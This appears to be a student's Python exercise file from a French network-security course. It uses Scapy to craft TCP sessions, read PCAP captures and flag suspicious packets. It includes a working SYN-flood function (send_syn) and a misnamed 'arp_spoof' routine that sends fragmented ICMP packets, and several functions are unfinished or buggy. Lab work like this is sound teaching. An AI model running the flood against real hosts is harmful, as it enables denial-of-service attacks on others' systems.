#!/usr/bin/env python
import os
# Pour le projet 2 AES
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes 
from cryptography.hazmat.primitives import padding 

# Pour le projet 3 RSA
from cryptography.hazmat.primitives.asymmetric import rsa 
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes 
from cryptography.hazmat.primitives.asymmetric import padding

# Pour le projet 4 SSH via Paramiko
import paramiko

# Séance 2
from scapy.all import *


"""
INFO :
    - send() : pancket sans retour
    - data=sr1() envoie avec attente de retour
    - data,datan=sr()
        - data: paquets envoyés et reçus
        - data=[[pkt-env,pkt-reçus],[pkt-env1,pkt-reçus1]]

"""
"""
Exercice 1 : Analyse de paquets anormaux
- Lire un fichier PCAP contenant des captures de trafic réseau (ex. téléchargé à l’avance).
- Filtrer et extraire uniquement les paquets suspectés de comporter des anomalies,
comme des paquets avec des ports inhabituels ou des IPs invalides.
Exemple de code :
"""
def send_tcp_packet(counter,ip_layer, tcp_packet,pkt_nbr):
    """Envoie un paquet TCP à travers Scapy"""
    # Si notre requête est celle de la data (nécessite un paramètre supplémentaire)
    if (counter == 1):
        send(ip_layer / tcp_packet,count=pkt_nbr)
    # Sinon 
    else:
        send(ip_layer / tcp_packet)

def packet_sender(dst_ip, dst_port, src_port, data,cnt):
    """
    ----------------- A REVOIR ---------------------
    Simule une session TCP avec établissement de la connexion, échange de données et fermeture
    """
    # Configuration de la couche IP
    ip_layer = IP(dst=dst_ip)
    print("IP layer",ip_layer)

    # Étape 1 : Envoi du paquet SYN pour initier la connexion
    print("Étape 1: Envoi SYN pour initier la connexion.")
    tcp_syn = TCP(dport=dst_port, sport=src_port, flags="S", seq=1000)
    syn_ack_response = sr1(ip_layer / tcp_syn)  # Attente de la réponse SYN+ACK
    
    # Étape 2 : Envoi de l'ACK pour établir la connexion
    print("Étape 2: Réponse SYN+ACK reçue, envoi de l'ACK pour établir la connexion.")
    ack_packet = TCP(dport=dst_port, sport=src_port, flags="A", seq=1001, ack=syn_ack_response.seq + 1)
    send_tcp_packet(0,ip_layer, ack_packet,cnt)
    
    # Étape 3 : Envoi de données
    print(f"Étape 3: Envoi de données : {data}")
    send_tcp_packet(1,ip_layer, TCP(dport=dst_port, sport=src_port, flags="PA", seq=1002, ack=syn_ack_response.seq + 1) / data, cnt)
    
    # Attente d'une réponse (en vrai, tu ferais une vérification ici)
    time.sleep(2)
    
    # Étape 4 : Fermeture de la connexion avec un paquet FIN
    print("Étape 4: Fermeture de la connexion avec un paquet FIN.")
    fin_packet = TCP(dport=dst_port, sport=src_port, flags="FA", seq=1003, ack=syn_ack_response.seq + 1)
    send_tcp_packet(0,ip_layer, fin_packet,cnt)

    # Attente d'un ACK pour fermer proprement la connexion
    time.sleep(2)
    ack_fin_packet = TCP(dport=dst_port, sport=src_port, flags="A", seq=1004, ack=syn_ack_response.seq + 2)
    send_tcp_packet(0,ip_layer, ack_fin_packet,cnt)
    
    print("Connexion fermée.")

def arp_spoof():
    fragmented_packets = fragment(IP(dst_ip) / ICMP(), fragsize=20) 
    for fragment in fragmented_packets: 
        send(fragment) 
    pkt = IP(dst_ip, options=[IPOption("RA")]) / ICMP() 
    pkt.show()

def packets_reader():
    print(os.listdir())
    packets = rdpcap(input("Quel paquet souhaite-tu ouvrir?"))
    for pkt in packets:
        if (pkt.haslayer(TCP) and pkt[TCP].flags == "S" and pkt[TCP].dport > 10):
            print(f"Paquet suspect : {pkt.summary()}")

# SYN flood 
def send_syn(dst_ip, dst_port, pkt_nbr, pkt_size):
    ip = IP(dst=dst_ip)
    tcp = TCP(sport=RandShort(), dport=dst_port, flags="S")
    raw = Raw(b"X" * pkt_size)
    p = ip / tcp / raw
    send(p, count=pkt_nbr, verbose=0)
    print('send_syn(): Sent ' + str(pkt_nbr) + ' packets of ' + str(pkt_size) + ' size to ' + dst_ip + ' on port ' + str(dst_port))                                                                                     

def detect_malicious_payload(packets): 
    for pkt in packets: 
        if pkt.haslayer(Raw) and b"malicious" in pkt[Raw].load: 
            print(f"Paquet suspect : {pkt.summary()}")
